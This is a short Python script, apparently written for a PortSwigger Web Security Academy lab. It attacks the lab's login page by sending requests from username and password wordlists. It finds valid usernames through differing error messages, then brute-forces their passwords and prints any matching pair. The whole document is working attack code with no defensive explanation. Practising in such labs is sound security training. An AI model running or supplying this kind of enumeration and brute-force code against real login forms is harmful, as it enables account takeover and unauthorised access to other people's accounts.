#!/usr/bin/python3


import requests,re
from pwn import *

url = 'https://0a15007f03adc4f8c0457c8900a40008.web-security-academy.net/login'
user_list = open('/home/kali/burpsuite/wordlist/user.txt','r').read().split('\n')
password_list = open('/home/kali/burpsuite/wordlist/password.txt','r').read().split('\n')

flag_user = 'Incorrect password'
flag_password = 'Your username is:'


user_found = []

def find_user():
    user_log = log.progress('Finding username'+"\n")
    for i in user_list:
        login = {
        'username':str(i),
        'password':'balls'
        }
        r = requests.post(url,data=login)
        out = r.text
        if re.search(flag_user,out):
            user_found.append(i)
            user_log.success('User found : ' + str(i))

def find_password():
    password_log = log.progress('Finding password'+"\n")
    for i in user_found:
        for x in password_list:
            login = {
            'username':str(i),
            'password':str(x)
            }
            r = requests.post(url,data=login)
            out = r.text
            if re.search(flag_password,out):
                password_log.success('Match combinasion : ' + str(i) + ':' + str(x)+"\n")


find_user()
find_password()